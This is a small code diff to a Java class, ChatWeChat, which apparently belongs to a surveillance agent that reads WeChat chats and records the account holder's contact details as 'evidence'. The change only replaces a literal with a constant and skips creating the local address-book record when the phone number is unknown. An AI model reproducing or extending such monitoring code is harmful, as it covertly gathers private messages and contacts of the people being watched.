@@ -44,7 +44,7 @@ public class ChatWeChat extends SubModuleChat {
 	// private String myPhoneNumber = "local";
 	String myId;
 	String myName;
-	String myPhone = "local";
+	String myPhone = DEFAULT_LOCAL_NUMBER;
 
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
@@ -319,7 +319,10 @@ public class ChatWeChat extends SubModuleChat {
 			Check.log(TAG + " (setMyAccount) %s, %s, %s", myId, myName, myPhone);
 		}
 
-		ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WECHAT, myId, myName);
+		if (!DEFAULT_LOCAL_NUMBER.equals(myPhone)) {
+			ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.WECHAT, myId, myName);
+		}
+		
 
 	}
 
